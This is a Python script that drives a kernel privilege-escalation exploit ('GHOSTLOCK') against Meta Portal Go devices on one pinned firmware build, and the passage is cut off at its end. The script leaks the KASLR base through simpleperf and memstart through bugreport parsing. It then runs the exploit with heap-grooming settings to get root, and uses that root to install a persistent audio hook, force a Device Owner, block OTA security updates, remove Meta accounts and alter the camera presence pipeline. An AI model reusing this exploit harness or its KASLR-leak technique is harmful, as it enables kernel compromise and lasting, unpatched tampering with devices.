#!/usr/bin/env python3
"""Provision and verify persistent Portal Go system customizations."""

from __future__ import annotations

import argparse
import collections
import datetime as dt
import pathlib
import re
import select
import shlex
import subprocess
import sys
import tempfile
import time
import zipfile


ROOT = pathlib.Path(__file__).resolve().parents[1]
EXPECTED_FINGERPRINT = (
    "Facebook/terry_prod/terry:10/QKQ1.210213.001/"
    "5051355900018050:user/prod-keys"
)
PRELOAD_LOCAL = ROOT / "exploit/build/preload-portal-terry-5051355900018050.so"
HELPER_LOCAL = ROOT / "helper/build/libportal_audio_persist.so"
PRELOAD_REMOTE = "/data/local/tmp/preload-portal.so"
HELPER_REMOTE = "/data/local/tmp/libportal_audio_persist.so"
ACCOUNT_CTL_LOCAL = ROOT / "exploit/build/portal-account-ctl.jar"
ACCOUNT_CTL_REMOTE = "/data/local/tmp/portal-account-ctl.jar"
KIOSK_COMPONENT = "me.jxl.kiosk_satellite/.KioskAdminReceiver"
KIOSK_OWNER_COMPONENTS = (
    "admin=me.jxl.kiosk_satellite/.KioskAdminReceiver",
    "admin=ComponentInfo{me.jxl.kiosk_satellite/"
    "me.jxl.kiosk_satellite.KioskAdminReceiver}",
)
DEBLOAT_BACKUP_REMOTE = "/data/local/tmp/portal-debloat-backup-v1.tsv"
PACKAGE_STATE_SETTLE_SECONDS = 15
DEBLOAT_PACKAGES = (
    "com.facebook.aloha.analytics",
    "com.facebook.aloha.app.messenger",
    "com.facebook.aloha.app.whatsapp",
    "com.facebook.aloha.app.portalfeed",
    "com.facebook.alohaapps.superframe",
    "com.facebook.alohaapps.contacts",
)
META_ACCOUNT_BACKUP_REMOTE = "/data/local/tmp/portal-meta-accounts-before-v1.tsv"
META_ACCOUNT_TYPES = (
    "com.facebook.aloha.sso",
    "com.facebook.aloha.pl",
    "com.facebook.aloha.hw",
    "com.facebook.aloha.privowner",
)
META_AUTHENTICATOR_COMPONENTS = (
    "com.facebook.aloha.system.alohausers.services.AuthenticationService",
    "com.facebook.aloha.system.alohausers.services2.PLAuthenticatorService",
    "com.facebook.aloha.system.alohausers.services2.HWAuthenticatorService",
    "com.facebook.aloha.system.alohausers.services2."
    "PrivOwnerAccountsAuthenticatorService",
)
PRESENCE_PROFILE_KEYS = (
    "enable_cv_background_detector_v2",
    "enable_liveness_metric",
    "enable_color_based_reid",
    "enable_face_rec_based_reid_v3",
)
PRESENCE_LOG_MARKER = "Notify people presence"
PRESENCE_ANALYSIS_FRAME_MARKER = "Frame available for analysis stream"
PRESENCE_ROI_FRAME_MARKER = "Frame available for roi stream"
CAMERA_SERVICE_COMPONENT = (
    "com.facebook.portal.aiservice/"
    "com.facebook.alohaapp.app.services.CameraService"
)


class ProvisionError(RuntimeError):
    pass


class PortalProvisioner:
    def __init__(
        self,
        serial: str,
        attempts: int,
        log_dir: pathlib.Path,
        audio: bool = False,
        device_owner: bool = False,
        disable_updates: bool = False,
        debloat: bool = False,
        restore_bloat: bool = False,
        remove_meta_accounts: bool = False,
        optimize_presence: bool = False,
        restore_presence_profile: bool = False,
        skip_build: bool = False,
    ):
        self.serial = serial
        self.attempts = attempts
        self.log_dir = log_dir
        self.audio = audio
        self.device_owner = device_owner
        self.disable_updates = disable_updates
        self.debloat = debloat
        self.restore_bloat = restore_bloat
        self.remove_meta_accounts = remove_meta_accounts
        self.optimize_presence = optimize_presence
        self.restore_presence_profile = restore_presence_profile
        self.skip_build = skip_build
        self.adb = ["adb", "-s", serial]

    @staticmethod
    def run(
        args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        try:
            result = subprocess.run(
                args,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired as exc:
            raise ProvisionError(f"command timed out: {shlex.join(args)}") from exc
        if check and result.returncode != 0:
            raise ProvisionError(
                f"command failed ({result.returncode}): {shlex.join(args)}\n"
                f"{result.stdout[-2000:]}"
            )
        return result

    def adb_run(
        self, args: list[str], timeout: float | None = None, check: bool = False
    ) -> subprocess.CompletedProcess[str]:
        return self.run(self.adb + args, timeout=timeout, check=check)

    def connect(self, wait_seconds: int = 150) -> None:
        try:
            self.run(["adb", "disconnect", self.serial], timeout=5)
        except ProvisionError:
            pass
        deadline = time.monotonic() + wait_seconds
        while time.monotonic() < deadline:
            try:
                self.run(["adb", "connect", self.serial], timeout=5)
                state = self.adb_run(["get-state"], timeout=5)
                completed = self.adb_run(
                    ["shell", "getprop", "sys.boot_completed"], timeout=5
                )
                if state.returncode == 0 and completed.stdout.strip() == "1":
                    return
            except ProvisionError:
                pass
            time.sleep(3)
        raise ProvisionError(f"{self.serial} did not reconnect after {wait_seconds}s")

    def reboot(self) -> tuple[str, str]:
        before = self.adb_run(
            ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
            timeout=5,
            check=True,
        ).stdout.strip()
        try:
            self.adb_run(["reboot"], timeout=8)
        except ProvisionError:
            # adbd can disappear before acknowledging a successful reboot.
            pass
        after = self.connect_after_reboot(before)
        return before, after

    def connect_after_reboot(self, before: str, wait_seconds: int = 180) -> str:
        try:
            self.run(["adb", "disconnect", self.serial], timeout=5)
        except ProvisionError:
            pass
        deadline = time.monotonic() + wait_seconds
        last_boot_id = ""
        while time.monotonic() < deadline:
            try:
                self.run(["adb", "connect", self.serial], timeout=5)
                state = self.adb_run(["get-state"], timeout=5)
                completed = self.adb_run(
                    ["shell", "getprop", "sys.boot_completed"], timeout=5
                )
                boot = self.adb_run(
                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"], timeout=5
                )
                last_boot_id = boot.stdout.strip()
                if (
                    state.returncode == 0
                    and completed.stdout.strip() == "1"
                    and last_boot_id
                    and last_boot_id != before
                ):
                    return last_boot_id
            except ProvisionError:
                pass
            time.sleep(3)
        raise ProvisionError(
            f"{self.serial} did not complete a new boot after {before}; "
            f"last boot ID was {last_boot_id!r}"
        )

    def verify_target(self) -> None:
        fingerprint = self.adb_run(
            ["shell", "getprop", "ro.build.fingerprint"], timeout=5, check=True
        ).stdout.strip()
        if fingerprint != EXPECTED_FINGERPRINT:
            raise ProvisionError(
                "unsupported firmware; refusing build-specific kernel writes\n"
                f"expected: {EXPECTED_FINGERPRINT}\nactual:   {fingerprint}"
            )
        model = self.adb_run(
            ["shell", "getprop", "ro.product.device"], timeout=5, check=True
        ).stdout.strip()
        if model != "terry":
            raise ProvisionError(f"unsupported device: {model!r}")
        print(f"TARGET_OK serial={self.serial} device={model} fingerprint={fingerprint}")

    def stage(self) -> None:
        files = [(PRELOAD_LOCAL, PRELOAD_REMOTE)]
        if self.audio:
            files.append((HELPER_LOCAL, HELPER_REMOTE))
        if self.remove_meta_accounts:
            files.append((ACCOUNT_CTL_LOCAL, ACCOUNT_CTL_REMOTE))
        for local, remote in files:
            if not local.is_file() or local.stat().st_size == 0:
                raise ProvisionError(f"missing build output: {local}")
            self.adb_run(["push", str(local), remote], timeout=30, check=True)
            self.adb_run(["shell", "chmod", "0755", remote], timeout=5, check=True)
        staged = f"preload={PRELOAD_REMOTE}"
        if self.audio:
            staged += f" helper={HELPER_REMOTE}"
        if self.remove_meta_accounts:
            staged += f" account_ctl={ACCOUNT_CTL_REMOTE}"
        print(f"STAGED {staged}")

    def meta_accounts(self) -> list[tuple[str, str]]:
        output = self.adb_run(
            ["shell", "dumpsys", "account"], timeout=20, check=True
        ).stdout
        accounts = re.findall(
            r"Account \{name=([^,}]+), type=([^}]+)\}", output
        )
        return [
            (name, account_type)
            for name, account_type in accounts
            if account_type in META_ACCOUNT_TYPES
        ]

    def disabled_meta_authenticators(self) -> set[str]:
        output = self.adb_run(
            ["shell", "dumpsys", "package", "com.facebook.alohaservices.alohausers"],
            timeout=20,
            check=True,
        ).stdout
        match = re.search(
            r"disabledComponents:\s*(.*?)(?:\n\s*\w[^:\n]*:|\Z)",
            output,
            re.DOTALL,
        )
        return set() if match is None else set(match.group(1).split())

    def meta_accounts_preflight(self) -> bool:
        accounts = self.meta_accounts()
        disabled = self.disabled_meta_authenticators()
        already_clean = not accounts and set(META_AUTHENTICATOR_COMPONENTS) <= disabled
        existing = self.adb_run(
            ["shell", "cat", META_ACCOUNT_BACKUP_REMOTE], timeout=5
        )
        if existing.returncode != 0:
            contents = "# portal-meta-accounts-before-v1\n" + "".join(
                f"{account_type}\t{name}\n" for name, account_type in accounts
            )
            with tempfile.TemporaryDirectory(prefix="portal-meta-accounts-") as tmp:
                local = pathlib.Path(tmp) / "accounts.tsv"
                local.write_text(contents, encoding="utf-8")
                self.adb_run(
                    ["push", str(local), META_ACCOUNT_BACKUP_REMOTE],
                    timeout=15,
                    check=True,
                )
            self.adb_run(
                ["shell", "chmod", "0600", META_ACCOUNT_BACKUP_REMOTE],
                timeout=5,
                check=True,
            )
        else:
            contents = existing.stdout
        host_backup = self.log_dir / "meta-accounts-before.tsv"
        if not host_backup.exists():
            host_backup.write_text(contents, encoding="utf-8")
            host_backup.chmod(0o600)
        print(
            f"META_ACCOUNT_PREFLIGHT accounts={len(accounts)} "
            f"authenticators_disabled={len(disabled & set(META_AUTHENTICATOR_COMPONENTS))} "
            f"already_clean={int(already_clean)} backup={META_ACCOUNT_BACKUP_REMOTE}"
        )
        return already_clean

    def device_owner_preflight(self) -> bool:
        policy = self.adb_run(
            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
        ).stdout
        component = KIOSK_COMPONENT
        is_owner = "Device Owner:" in policy and any(
            owner_component in policy for owner_component in KIOSK_OWNER_COMPONENTS
        )
        is_admin = (
            "Enabled Device Admins (User 0" in policy
            and f"    {component}:" in policy
        )
        if "Device Owner:" in policy and not is_owner:
            raise ProvisionError("another Device Owner is already registered")
        if not is_admin:
            raise ProvisionError(f"Kiosk Satellite admin is not active: {component}")
        print(
            f"DEVICE_OWNER_PREFLIGHT component={component} "
            f"active_admin=1 already_owner={int(is_owner)}"
        )
        return is_owner

    def kaslr_base(self, tag: str) -> int:
        offsets = (
            0x3D7E,
            0x3D54,
            0x153C,
            0x11756DC,
            0x1175724,
            0x363C6,
            0xAF90E,
            0x136E,
            0x3A72,
        )
        for sample_try in range(3):
            remote = f"/data/local/tmp/portal-perf-{tag}-{sample_try}.data"
            command = (
                "simpleperf record -g -e cpu-clock -f 4000 --duration 2 "
                f"-o {shlex.quote(remote)} -- /system/bin/dd if=/dev/zero "
                "of=/dev/null bs=4096"
            )
            self.adb_run(["shell", command], timeout=20)
            report = self.adb_run(
                ["shell", "simpleperf", "report-sample", "-i", remote],
                timeout=30,
            )
            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
            values = [
                int(value, 16)
                for value in re.findall(
                    r"vaddr_in_file: (ffffff[0-9a-f]+)", report.stdout
                )
            ]
            candidates: collections.Counter[int] = collections.Counter()
            for value in values:
                for offset in offsets:
                    base = value - offset
                    if (
                        base >= 0xFFFFFF8000000000
                        and (base - 0xFFFFFF8008080000) & 0x1FFFFF == 0
                    ):
                        candidates[base] += 1
            if candidates:
                return candidates.most_common(1)[0][0]
        raise ProvisionError("simpleperf did not expose a recognized kernel PC")

    def memstart(self, tag: str) -> int:
        result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
        match = re.search(r"OK:(\S+\.zip)", result.stdout)
        if not match:
            raise ProvisionError(f"bugreportz failed: {result.stdout[-500:]}")
        remote = match.group(1)
        with tempfile.TemporaryDirectory(prefix=f"portal-{tag}-") as temporary:
            local = pathlib.Path(temporary) / "bugreport.zip"
            self.adb_run(["pull", remote, str(local)], timeout=60, check=True)
            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
            with zipfile.ZipFile(local) as archive:
                report_name = next(
                    (
                        name
                        for name in archive.namelist()
                        if pathlib.PurePosixPath(name).name.startswith("bugreport-")
                        and name.endswith(".txt")
                    ),
                    None,
                )
                if report_name is None:
                    raise ProvisionError("bugreport text is absent from archive")
                report = archive.read(report_name).decode(errors="replace")
        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
        if not match:
            raise ProvisionError("kernel virtual memory range is absent from bugreport")
        virtual_start = int(match.group(1), 16)
        return (
            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
        ) & 0xFFFFFFFFFFFFFFFF

    def exploit(self, base: int, memstart: int, attempt: int) -> bool:
        environment = {
            "GHOSTLOCK_KASLR_BASE": hex(base),
            "GHOSTLOCK_P0_MEMSTART": hex(memstart),
            "GHOSTLOCK_TRUST_EXTERNAL_KASLR": "1",
            "GHOSTLOCK_MM_PARTIALS": "14",
            "GHOSTLOCK_PAGE_COLLISIONS": "5",
            "GHOSTLOCK_BUDDY_HOLD_PAIRS": "64",
            "GHOSTLOCK_BUDDY_HOLD_SENDS": "1024",
            "GHOSTLOCK_RECLAIM_PAIRS": "64",
            "GHOSTLOCK_RECLAIM_SENDS": "64",
            "GHOSTLOCK_SOCKET_WATCH": "1",
            "GHOSTLOCK_WATCH_CFI": "1",
            "GHOSTLOCK_SENDMMSG_PROC_UID_LOCK": "1",
            "GHOSTLOCK_PROC_UID_APP_SENTINEL": "1",
            "GHOSTLOCK_PROC_UID_RUNAS_SENTINEL": "1",
            "GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN": "1",
            "GHOSTLOCK_HOLD_AFTER_SCHED": "1",
            "GHOSTLOCK_MAIN_ROUTE": "slide-sendmmsg",
            "GHOSTLOCK_FOPS_STACK_ROUTE": "sendmmsg",
            "GHOSTLOCK_PROC_UID_WARM_MB": "256",
            "GHOSTLOCK_ADBD_ROOT_CONFIGFS": "1",
            "GHOSTLOCK_ROOT_SELF_CONFIGFS": "1",
            "GHOSTLOCK_VOLATILE_LOG": "1",
            "LD_PRELOAD": PRELOAD_REMOTE,
        }
        if self.audio:
            environment.update(
                {
                    "GHOSTLOCK_AUDIO_CTL": "1",
                    "GHOSTLOCK_AUDIO_PERSIST": "1",
                    "GHOSTLOCK_AUDIO_PERSIST_SO": HELPER_REMOTE,
                }
            )
        if self.device_owner:
            environment["GHOSTLOCK_KIOSK_DEVICE_OWNER"] = "1"
        if self.disable_updates:
            environment["GHOSTLOCK_OTA_BLOCK"] = "1"
        if self.optimize_presence:
            environment["GHOSTLOCK_PRESENCE_PROFILE"] = "1"
        if self.restore_presence_profile:
            environment["GHOSTLOCK_RESTORE_PRESENCE_PROFILE"] = "1"
        if self.remove_meta_accounts:
            environment.update(
                {
                    "GHOSTLOCK_REMOVE_META_ACCOUNTS": "1",
                    "GHOSTLOCK_META_ACCOUNT_CTL_JAR": ACCOUNT_CTL_REMOTE,
                }
            )
        self.adb_run(
            ["shell", "am", "force-stop", "--user", "0", "com.facebook.aloha.analytics"],
            timeout=10,
        )
        self.adb_run(["shell", "logcat", "-c"], timeout=5)
        shell = "env " + " ".join(
            f"{name}={shlex.quote(value)}" for name, value in environment.items()
        ) + " /system/bin/true"
        log_path = self.log_dir / f"attempt-{attempt}.log"
        success = False
        failed = False
        failure_markers = (
            "WATCH_CFI_OK=0",
            "pre-signal FOPS check miss",
            "held reclaim payload inspection complete clean=0",
            "held child CFI complete ok=0",
        )
        with log_path.open("w", encoding="utf-8") as output:
            process = subprocess.Popen(
                self.adb + ["shell", shell],
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=1,
            )
            assert process.stdout is not None
            deadline = time.monotonic() + 300
            while time.monotonic() < deadline:
                ready, _, _ = select.select([process.stdout], [], [], 1)
                if not ready:
                    if process.poll() is not None:
                        break
                    continue
                line = process.stdout.readline()
                if not line:
                    break
                sys.stdout.write(line)
                sys.stdout.flush()
                output.write(line)
                output.flush()
                if self.remove_meta_accounts:
                    success_marker = "Meta account removal "
                elif self.restore_presence_profile:
                    success_marker = "presence profile restore "
                elif self.optimize_presence:
                    success_marker = "presence profile install "
                elif self.disable_updates:
                    success_marker = "OTA block install "
                elif self.device_owner:
                    success_marker = "kiosk device owner install "
                elif self.audio:
                    success_marker = "audio persistence install "
                else:
                    raise ProvisionError("no privileged provisioning action selected")
                if success_marker in line and "ok=1" in line:
                    success = True
                    break
                if any(marker in line for marker in failure_markers):
                    failed = True
                    break

            print(
                f"INSTALL_ATTEMPT_RESULT attempt={attempt} "
                f"success={int(success)} early_failure={int(failed)}"
            )
            try:
                self.adb_run(["reboot"], timeout=8)
            except ProvisionError:
                pass
            process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=3)
        return success

    def verify_watchdog(self, wait_seconds: int = 25) -> str:
        deadline = time.monotonic() + wait_seconds
        last_log = ""
        while time.monotonic() < deadline:
            result = self.adb_run(
                ["shell", "logcat", "-d", "-s", "PortalAudioPersist:*"],
                timeout=10,
            )
            last_log = result.stdout
            started = "persistent audio watchdog started" in last_log
            verified = "audio processing verified aec=0 ns=0" in last_log
            aec = re.search(r"param=3001 .*after=0 .*ok=1", last_log)
            ns = re.search(r"param=4001 .*after=0 .*ok=1", last_log)
            if started and (verified or (aec and ns)):
                pid = self.adb_run(
                    ["shell", "pidof", "com.facebook.portal.aiservice"],
                    timeout=5,
                    check=True,
                ).stdout.strip()
                boot_id = self.adb_run(
                    ["shell", "cat", "/proc/sys/kernel/random/boot_id"],
                    timeout=5,
                    check=True,
                ).stdout.strip()
                print(f"WATCHDOG_OK boot_id={boot_id} aiservice_pid={pid}")
                print(last_log.rstrip())
                return boot_id
            time.sleep(2)
        raise ProvisionError(
            "watchdog did not verify after boot; recent log follows:\n"
            + last_log[-4000:]
        )

    def verify_device_owner(self) -> None:
        component = KIOSK_COMPONENT
        policy = self.adb_run(
            ["shell", "dumpsys", "device_policy"], timeout=15, check=True
        ).stdout
        owner_block = re.search(
            r"Device Owner:\s+(.*?)(?:\n\s*Profile Owner|\n\S|\Z)",
            policy,
            re.DOTALL,
        )
        if (
            owner_block is None
            or not any(
                owner_component in owner_block.group(1)
                for owner_component in KIOSK_OWNER_COMPONENTS
            )
            or "User ID: 0" not in owner_block.group(1)
        ):
            raise ProvisionError(
                "Kiosk Satellite is not the loaded Device Owner; "
                "dumpsys excerpt follows:\n" + policy[:5000]
            )
        owner_property = self.adb_run(
            ["shell", "getprop", "ro.device_owner"], timeout=5, check=True
        ).stdout.strip()
        if owner_property != "true":
            raise ProvisionError(
                f"Device Owner loaded but ro.device_owner={owner_property!r}"
            )
        print(
            f"DEVICE_OWNER_OK component={component} user=0 "
            f"ro.device_owner={owner_property}"
        )

    def disable_ota_packages(self) -> None:
        for package in (
            "com.facebook.aloha.otaui",
            "com.facebook.aloha.alohaotasetup",
        ):
            result = self.adb_run(
                ["shell", "pm", "disable-user", "--user", "0", package],
                timeout=10,
            )
            if result.returncode != 0 or "new state: disabled-user" not in result.stdout:
                already_disabled = self.adb_run(
                    ["shell", "pm", "list", "packages", "-d"],
                    timeout=10,
                    check=True,
                ).stdout
                if f"package:{package}" not in already_disabled:
                    raise ProvisionError(
                        f"failed to disable OTA package {package}: {result.stdout}"
                    )

    def verify_ota_block(self, wait_seconds: int = 30) -> None:
        disabled = self.adb_run(
            ["shell", "pm", "list", "packages", "-d"],
            timeout=10,
            check=True,
        ).stdout
        required = (
            "com.facebook.aloha.otaui",
            "com.facebook.aloha.alohaotasetup",
        )
        missing = [package for package in required if f"package:{package}" not in disabled]
        if missing:
            raise ProvisionError(f"OTA packages became enabled: {', '.join(missing)}")

        deadline = time.monotonic() + wait_seconds
        last_dump = ""
        last_log = ""
        while time.monotonic() < deadline:
            result = self.adb_run(
                ["shell", "dumpsys", "facebook.aloha.otaservice"], timeout=10
            )
            last_dump = result.stdout
            last_log = self.adb_run(
                ["shell", "logcat", "-d", "-v", "threadtime"], timeout=15
            ).stdout
            override_loaded = re.search(
                r"getLatestBooleanWithOptions \[18296358819858434\], "
                r"latestBoolean: false, source: OVERRIDE",
                last_log,
            )
            if (
                "getBool(kFirmwareOtaUpdateEnable): false" in last_dump
                and override_loaded
            ):
                print(
                    "OTA_BLOCK_OK packages=disabled "
                    "firmware_ota_update_enable=false source=OVERRIDE"
                )
                return
            time.sleep(2)
        raise ProvisionError(
            "OTA daemon did not report its firmware-update gate from the "
            "local override; recent dump/log follow:\n"
            + last_dump[-3000:]
            + "\n"
            + last_log[-3000:]
        )

    def package_sets(self) -> tuple[set[str], set[str]]:
        installed_result = self.adb_run(
            ["shell", "pm", "list", "packages"], timeout=15, check=True
        )
        disabled_result = self.adb_run(
            ["shell", "pm", "list", "packages", "-d"], timeout=15, check=True
        )

        def parse(output: str) -> set[str]:
            return {
                line.removeprefix("package:").strip()
                for line in output.splitlines()
                if line.startswith("package:")
            }

        return parse(installed_result.stdout), parse(disabled_result.stdout)

    @staticmethod
    def parse_debloat_backup(contents: str) -> dict[str, str]:
        lines = contents.splitlines()
        if not lines or lines[0] != "# portal-debloat-backup-v1":
            raise ProvisionError("unrecognized Portal debloat backup format")
        states: dict[str, str] = {}
        for line in lines[1:]:
            if not line:
                continue
            fields = line.split("\t")
            if len(fields) != 2:
                raise ProvisionError(f"invalid Portal debloat backup line: {line!r}")
            package, state = fields
            if package in states or package not in DEBLOAT_PACKAGES:
                raise ProvisionError(
                    f"unexpected package in Portal debloat backup: {package!r}"
                )
            if state not in {"enabled", "disabled", "absent"}:
                raise ProvisionError(
                    f"invalid state in Portal debloat backup: {state!r}"
                )
            states[package] = state
        missing = set(DEBLOAT_PACKAGES) - states.keys()
        if missing:
            raise ProvisionError(
                "Portal debloat backup is incomplete: " + ", ".join(sorted(missing))
            )
        return states

    def read_debloat_backup(self, required: bool = True) -> dict[str, str] | None:
        result = self.adb_run(
            ["shell", "cat", DEBLOAT_BACKUP_REMOTE], timeout=5
        )
        if result.returncode != 0:
            if required:
                raise ProvisionError(
                    f"debloat backup is absent: {DEBLOAT_BACKUP_REMOTE}"
                )
            return None
        return self.parse_debloat_backup(result.stdout)

    def ensure_debloat_backup(self) -> dict[str, str]:
        existing = self.read_debloat_backup(required=False)
        if existing is not None:
            print(f"DEBLOAT_BACKUP_OK existing=1 path={DEBLOAT_BACKUP_REMOTE}")
            return existing

        installed, disabled = self.package_sets()
        states = {
            package: (
                "absent"
                if package not in installed
                else "disabled"
                if package in disabled
                else "enabled"
            )
            for package in DEBLOAT_PACKAGES
        }
        contents = "# portal-debloat-backup-v1\n" + "".join(
            f"{package}\t{states[package]}\n" for package in DEBLOAT_PACKAGES
        )
        remote_tmp = DEBLOAT_BACKUP_REMOTE + ".tmp"
        with tempfile.TemporaryDirectory(prefix="portal-debloat-") as temporary:
            local = pathlib.Path(temporary) / "backup.tsv"
            local.write_text(contents, encoding="utf-8")
            self.adb_run(["push", str(local), remote_tmp], timeout=15, check=True)
        command = (
            f"chmod 0600 {shlex.quote(remote_tmp)} && "
            f"mv {shlex.quote(remote_tmp)} {shlex.quote(DEBLOAT_BACKUP_REMOTE)}"
        )
        self.adb_run(["shell", command], timeout=10, check=True)
        saved = self.read_debloat_backup(required=True)
        if saved != states:
            raise ProvisionError("debloat backup verification failed after write")
        print(f"DEBLOAT_BACKUP_OK existing=0 path={DEBLOAT_BACKUP_REMOTE}")
        return states

    def apply_debloat(self) -> None:
        self.ensure_debloat_backup()
        installed, _ = self.package_sets()
        for package in DEBLOAT_PACKAGES:
            if package not in installed:
                print(f"DEBLOAT_SKIP package={package} reason=absent")
                continue
            result = self.adb_run(
                ["shell", "pm", "disable-user", "--user", "0", package],
                timeout=15,
            )
            if result.returncode != 0:
                raise ProvisionError(
                    f"failed to disable debloat package {package}: {result.stdout}"
                )
            print(f"DEBLOAT_DISABLE package={package}")
        self.settle_package_state()
        self.verify_debloat()

    def restore_debloat(self) -> None:
        states = self.read_debloat_backup(required=True)
        assert states is not None
        installed, _ = self.package_sets()
        for package in DEBLOAT_PACKAGES:
            state = states[package]
            if state == "absent" or package not in installed:
                print(
                    f"DEBLOAT_RESTORE_SKIP package={package} "
                    f"original_state={state}"
                )
                continue
            action = "enable" if state == "enabled" else "disable-user"
            command = ["shell", "pm", action, "--user", "0", package]
            result = self.adb_run(command, timeout=15)
            if result.returncode != 0:
                raise ProvisionError(
                    f"failed to restore package {package} to {state}: {result.stdout}"
                )
            print(f"DEBLOAT_RESTORE package={package} state={state}")
        self.settle_package_state()
        self.verify_debloat_restored()

    def settle_package_state(self) -> None:
        # PackageManager writes package-restrictions.xml asynchronously. An
        # immediate reboot can discard a state that pm already reports live.
        print(
            f"PACKAGE_STATE_SETTLE seconds={PACKAGE_STATE_SETTLE_SECONDS}",
            flush=True,
        )
        time.sleep(PACKAGE_STATE_SETTLE_SECONDS)
        self.adb_run(["shell", "sync"], timeout=15, check=True)

    def verify_retained_platform(self, wait_seconds: int = 45) -> None:
        deadline = time.monotonic() + wait_seconds
        ai_pid = ""
        camera = ""
        webview = ""
        home = ""
        while time.monotonic() < deadline:
            ai_pid = self.adb_run(
                ["shell", "pidof", "com.facebook.portal.aiservice"],
                timeout=5,
            ).stdout.strip()
            camera = self.adb_run(
                ["shell", "dumpsys", "media.camera"], timeout=15
            ).stdout
            webview = self.adb_run(
                ["shell", "dumpsys", "webviewupdate"], timeout=15
            ).stdout
            home = self.adb_run(
                [
                    "shell",
                    "cmd",
                    "package",
                    "resolve-activity",
                    "--brief",
                    "-a",
                    "android.intent.action.MAIN",
                    "-c",
                    "android.intent.category.HOME",
                ],
                timeout=10,
            ).stdout.strip()
            if (
                ai_pid
                and "Number of camera devices: 2" in camera
                and "Current WebView package (name, version): "
                "(com.facebook.portal.webview," in webview
                and "/" in home
            ):
                print(
                    f"DEBLOAT_PLATFORM_OK aiservice_pid={ai_pid} cameras=2 "
                    f"home={home.splitlines()[-1]}"
                )
                return
            time.sleep(2)
        raise ProvisionError(
            "retained Portal services did not become ready after package-state change: "
            f"aiservice_pid={ai_pid!r} cameras_2="
            f"{int('Number of camera devices: 2' in camera)} webview="
            f"{int('(com.facebook.portal.webview,' in webview)} home={home!r}"
        )

    def verify_debloat(self) -> None:
        installed, disabled = self.package_sets()
        missing = [
            package
            for package in DEBLOAT_PACKAGES
            if package in installed and package not in disabled
        ]
        if missing:
            raise ProvisionError(
                "debloat packages became enabled: " + ", ".join(missing)
            )
        self.verify_retained_platform()
        print(f"DEBLOAT_OK disabled={len(set(DEBLOAT_PACKAGES) & installed)}")

    def verify_debloat_restored(self) -> None:
        states = self.read_debloat_backup(required=True)
        assert states is not None
        installed, disabled = self.package_sets()
        mismatches = []
        for package, state in states.items():
            if state == "absent":
                continue
            actual = "disabled" if package in disabled else "enabled"
            if package not in installed or actual != state:
                mismatches.append(f"{package}={actual}, expected {state}")
        if mismatches:
            raise ProvisionError("debloat restore mismatch: " + "; ".join(mismatches))
        self.verify_retained_platform()
        print("DEBLOAT_RESTORE_OK")

    def verify_presence_runtime(
        self, require_profile: bool, wait_seconds: int = 90
    ) -> None:
        deadline = time.monotonic() + wait_seconds
        pid = ""
        camera_active = False
        camera_allowed = False
        presence_event = False
        analysis_frames = False
        roi_frames = False
        pose_metrics = False
        frame_processor_loaded = False
        loaded_keys: set[str] = set()
        threads = ""
        while time.monotonic() < deadline:
            pid = self.adb_run(
                ["shell", "pidof", "com.facebook.portal.aiservice"], timeout=5
            ).stdout.strip()
            camera = self.adb_run(
                ["shell", "dumpsys", "media.camera"], timeout=15
            ).stdout
            camera_active = (
                "Active Camera Clients:" in camera
                and "Client Package Name: com.facebook.portal.aiservice" in camera
            )
            appops = self.adb_run(
                [
                    "shell",
                    "cmd",
                    "appops",
                    "get",
                    "com.facebook.portal.aiservice",
                    "CAMERA",
                ],
                timeout=10,
            ).stdout
            camera_allowed = "CAMERA: allow" in appops
            logs = self.adb_run(
                ["shell", "logcat", "-d", "-v", "brief"], timeout=20
            ).stdout
            presence_event = PRESENCE_LOG_MARKER in logs
            analysis_frames = PRESENCE_ANALYSIS_FRAME_MARKER in logs
            roi_frames = PRESENCE_ROI_FRAME_MARKER in logs
            loaded_keys = {
                key
                for key in PRESENCE_PROFILE_KEYS
                if any(
                    "settings_config.xml" in line
                    and key in line
                    and re.search(r"\bfalse\b", line, re.IGNORECASE)
                    for line in logs.splitlines()
                )
            }
            config_ready = not require_profile or loaded_keys == set(
                PRESENCE_PROFILE_KEYS
            )
            metrics = self.adb_run(
                [
                    "shell",
                    "dumpsys",
                    "activity",
                    "service",
                    CAMERA_SERVICE_COMPONENT,
                ],
                timeout=20,
            ).stdout
            pose_section = ""
            frame_section = ""
            if "[ PoseEstimatorManagerMetrics ]" in metrics:
                pose_section = metrics.split(
                    "[ PoseEstimatorManagerMetrics ]", 1
                )[1].split("[ AlohaFrameProcessor ]", 1)[0]
            if "[ AlohaFrameProcessor ]" in metrics:
                frame_section = metrics.split(
                    "[ AlohaFrameProcessor ]", 1
                )[1].split("[ AiCameramanController ]", 1)[0]
                frame_processor_loaded = bool(frame_section)
            latency_bucket = re.compile(r"\b\d+ ms - \d+ ms:\s+\d+\b")
            pose_metrics = bool(latency_bucket.search(pose_section))
            if (
                pid
                and camera_active
                and camera_allowed
                and analysis_frames
                and roi_frames
                and pose_metrics
                and frame_processor_loaded
                and config_ready
            ):
                threads = self.adb_run(
                    ["shell", "ps", "-T", "-p", pid.split()[0]], timeout=10
                ).stdout
                disabled_workers = [
                    name
                    for name in ("BackgroundDetec", "alohaLivenessMa")
                    if name not in threads
                ]
                print(
                    "PRESENCE_RUNTIME_OK "
                    f"pid={pid.split()[0]} camera=active appop=allow "
                    "pipeline=active analysis_frames=observed "
                    "roi_frames=observed pose_metrics=populated "
                    "frame_processor=loaded "
                    f"presence_event={'observed' if presence_event else 'not_observed'} "
                    f"profile_keys={len(loaded_keys)} "
                    f"workers_absent={','.join(disabled_workers) or 'none'}"
                )
                return
            time.sleep(2)
        raise ProvisionError(
            "presence pipeline did not pass its live compatibility check: "
